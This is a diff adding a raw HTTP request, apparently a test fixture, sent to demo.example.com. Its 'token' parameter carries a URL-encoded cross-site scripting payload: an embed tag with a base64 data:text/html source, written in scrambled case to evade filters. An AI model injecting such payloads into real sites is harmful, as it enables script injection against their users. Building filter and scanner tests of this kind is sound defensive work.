@@ -1,0 +1,4 @@
+GET /a?token=<eMbEd%20SrC%3D"dAtA:tExT/hTmL;bAsE64,pHnJcMlWdD5hBgVyDcGxKtWvC2nYaXb0Pg%3D%3D"> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
